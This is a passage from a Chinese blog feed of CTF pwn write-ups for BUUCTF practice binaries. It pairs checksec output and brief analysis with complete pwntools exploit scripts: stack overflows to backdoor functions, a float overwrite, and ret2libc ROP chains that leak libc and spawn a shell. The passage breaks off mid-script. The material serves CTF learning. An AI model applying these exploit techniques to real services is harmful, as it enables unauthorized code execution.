**argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This program is hungry. You should feed it.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you feel the flow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入没有限制，生成一些字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br><span class="line"><span class="number">32</span><span class="keyword">in</span> isoc99_scanf.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x1</span></span><br><span class="line"> EBX  <span class="number">0xf7fb7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b2db0</span></span><br><span class="line"> ECX  <span class="number">0xa</span></span><br><span class="line"> EDX  <span class="number">0xf7fb887c</span> (_IO_stdfile_0_lock) ◂— <span class="number">0x1</span></span><br><span class="line"> EDI  <span class="number">0xf7fb7e00</span> (stdin) —▸ <span class="number">0xf7fb75a0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad2288</span></span><br><span class="line"> ESI  <span class="number">0xf7fb75a0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad2288</span></span><br><span class="line"> EBP  <span class="number">0xffffd068</span> —▸ <span class="number">0xffffd098</span> ◂— <span class="number">0x61616166</span> (<span class="string">&#x27;faaa&#x27;</span>)&lt;&lt;&lt;&lt;&lt;&lt;=这里</span><br><span class="line"> ESP  <span class="number">0xffffd040</span> —▸ <span class="number">0xf7fe77eb</span> (_dl_fixup+<span class="number">11</span>) ◂— add    esi, <span class="number">0x15815</span></span><br><span class="line"> EIP  <span class="number">0xf7e60151</span> (__isoc99_scanf+<span class="number">129</span>) ◂— <span class="keyword">and</span>    dword ptr [esi + <span class="number">0x3c</span>], <span class="number">0xffffffeb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic -l 0x61616166</span><br><span class="line">20</span><br></pre></td></tr></table></figure><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25672</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bbys_tu_2016&quot;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">20</span>+<span class="number">4</span>)+ p32(<span class="number">0x0804856D</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x20-jarvisoj-level3-x64&quot;&gt;&lt;a href=&quot;#0x20-jarvisoj-level3-x64&quot; class=&quot;headerlink&quot; title=&quot;0x20.jarvisoj_level3_x64&quot;&gt;&lt;/a&gt;0</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWN刷题_0x01-0x0F</title>
    <link href="http://example.com/2021/06/01/BUU-PWN-0x01-0x0F/"/>
    <id>http://example.com/2021/06/01/BUU-PWN-0x01-0x0F/</id>
    <published>2021-05-31T16:00:00.000Z</published>
    <updated>2021-07-20T12:28:49.523Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-test-your-nc"><a href="#0x1-test-your-nc" class="headerlink" title="0x1.test_your_nc"></a>0x1.test_your_nc</h2><p>nc一下就完事。</p><h2 id="0x2-rip"><a href="#0x2-rip" class="headerlink" title="0x2.rip"></a>0x2.rip</h2><p>checksec：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ida打开，有个后门函数：fun()</p><p>双击s到stack of main，15字节，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"><span class="comment">#具体86还是87/8a要看linux版本，太新的话写86会导致crash，所以题目写了是Ubuntu18</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x3-warmup-csaw-2016"><a href="#0x3-warmup-csaw-2016" class="headerlink" title="0x3.warmup_csaw_2016"></a>0x3.warmup_csaw_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file warmup_csaw_2016 </span><br><span class="line">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line"></span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec warmup_csaw_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/warmup_csaw_2016&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>程序首先将后门函数sub_40060D的地址给了出来，之后输入v5，0x40+8.</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./warmup_csaw_2016&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28063</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">72</span> + p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x4-pwn1-sctf-2016"><a href="#0x4-pwn1-sctf-2016" class="headerlink" title="0x4.pwn1_sctf_2016"></a>0x4.pwn1_sctf_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn1_sctf_2016 </span><br><span class="line">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn1_sctf_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn1_sctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ida打开看了下，有个vuln()函数，还有个get_flag()函数。</p><p>vuln函数中，将I转为you，输入的s有长度限制(32)，所以转换之后最长可以有32*3的长度，大于3C==60.</p><p>所以我们输入20个I，在写入4个垃圾数据，最后覆盖地址。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./level0&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25512</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x8048F0D</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x5-ciscn-2019-n-1"><a href="#0x5-ciscn-2019-n-1" class="headerlink" title="0x5.ciscn_2019_n_1"></a>0x5.ciscn_2019_n_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_n_1 </span><br><span class="line">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有个func()函数，输入的是v1，但是比较的是v2，将v2改为11.28125就OK</p><p>浮点数改为十六进制的话有脚本可以跑，下面说一下具体是怎么实现的。</p><p>首先11.28125转二进制的话是1011.01001。单精度浮点数是4个字节，也就是32位。</p><p>其中最高位是符号位，0为正，1为负。</p><p>接下来的8位是指数位。剩下的23位是尾数部分。</p><p>1011.01001 ==  1011.01001*2^0  ==  1.01101001*2^3</p><p>所以指数位就是（127+指数(3) ）的二进制表示，也就是1000 0010，至于为什么是127，规定。。</p><p>连起来就是01000001001101001000000000000000，十六进制表示就是0x4134800。</p><p>所以将v2覆盖为上面的值就OK。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">26204</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x6-jarvisoj-level0"><a href="#0x6-jarvisoj-level0" class="headerlink" title="0x6.jarvisoj_level0"></a>0x6.jarvisoj_level0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file level0 </span><br><span class="line">level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec level0</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/level0&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ida打开，有个后门函数，也有个vulnerable_function()函数</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./level0&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">28745</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>) + p64(<span class="number">0x40059A</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x7-ciscn-2019-c-1"><a href="#0x7-ciscn-2019-c-1" class="headerlink" title="0x7.ciscn_2019_c_1"></a>0x7.ciscn_2019_c_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_c_1 </span><br><span class="line">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序的漏洞在encrypt()函数里面，可以发现在gets时，存在栈溢出的漏洞，这题并没有后门函数，但有puts函数，可以用来泄露libc版本并构造ROP链。</p><p>在__libc_csu_init()函数的最后有个pop rdi,ret，可以用来构造ROP。</p><p>如果输入的字符串太少是不会进行加密的，</p><p>程序刚运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020ac</span><br><span class="line">0x6020ac &lt;x&gt;:0x0000000000000000</span><br></pre></td></tr></table></figure><p>进行一次加密后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020ac</span><br><span class="line">0x6020ac &lt;x&gt;:0x000000000000005b</span><br></pre></td></tr></table></figure><p>我们构造的payload是120，满足需要加密的条件。</p><p>exp1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;29497&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span><span class="comment">#这里是用来平等栈的，因为题目环境是Ubuntu18</span></span><br><span class="line"><span class="comment">#Ubuntu18调用system时要对齐栈，需要加一个ret来平衡，否则会crash。</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span>*<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;to be encrypted\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x58</span> * <span class="string">&#x27;a&#x27;</span> + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="comment"># 也可以多加几个ret，看出栈对齐的字节数。</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;to be encrypted\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>也有另一种绕过加密的方法，就是让v0&gt;=strlen(s)，我们可以让strlen(s)的长度为0，也就是让字符串的第一个字符为“\x00”，那样strlen函数读取到第一个字符串就会终止，就可以绕过加密。</p><p>exp2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot; , 27728)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt =elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got= elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rid_ret = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span>*(<span class="number">80</span> - <span class="number">1</span> + <span class="number">8</span>) + p64(pop_rid_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">puts_addr = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr = puts_addr.ljust(8,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-------------------&gt;&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">sys_libc = libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_libc = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">puts_libc = libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">retn = <span class="number">0x4006B9</span></span><br><span class="line"></span><br><span class="line">sys_addr = puts_addr + (sys_libc - puts_libc)</span><br><span class="line">bin_addr = puts_addr + (bin_sh_libc - puts_libc)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span>*(<span class="number">80</span> - <span class="number">1</span> + <span class="number">8</span>) + p64(retn) + p64(pop_rid_ret) + p64(bin_addr) + p64(sys_addr) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还有一种，就是老老实实的按照加密的思路写payload。</p><p>exp3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    newstr = <span class="built_in">list</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(newstr)):</span><br><span class="line">        c = <span class="built_in">ord</span>(s[i])</span><br><span class="line">        <span class="keyword">if</span> c &lt;= <span class="number">96</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt;= <span class="number">64</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> c &gt; <span class="number">47</span> <span class="keyword">and</span> c &lt;= <span class="number">57</span>:</span><br><span class="line">                    c ^= <span class="number">0xF</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               c ^= <span class="number">0xE</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c ^= <span class="number">0xD</span></span><br><span class="line">        newstr[i] = <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(newstr)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span 